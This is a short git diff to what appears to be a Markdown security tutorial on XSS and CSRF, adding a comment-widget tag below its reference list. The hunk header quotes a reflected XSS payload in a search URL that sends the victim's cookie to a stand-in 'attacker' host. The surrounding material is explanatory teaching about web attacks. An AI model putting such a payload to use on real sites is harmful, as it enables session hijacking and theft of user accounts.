@@ -125,3 +125,5 @@ http://website/search?keyword=<script>window.location='http://attacker/?cookie='
 
 1. [XSS Filter Evasion Cheat Sheet | OWASP](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
 2. [讓我們來談談 CSRF | TechBridge 技術共筆部落格](https://blog.techbridge.cc/2017/02/25/csrf-introduction/)
+
+<CustomVssue :title="$page.title" />
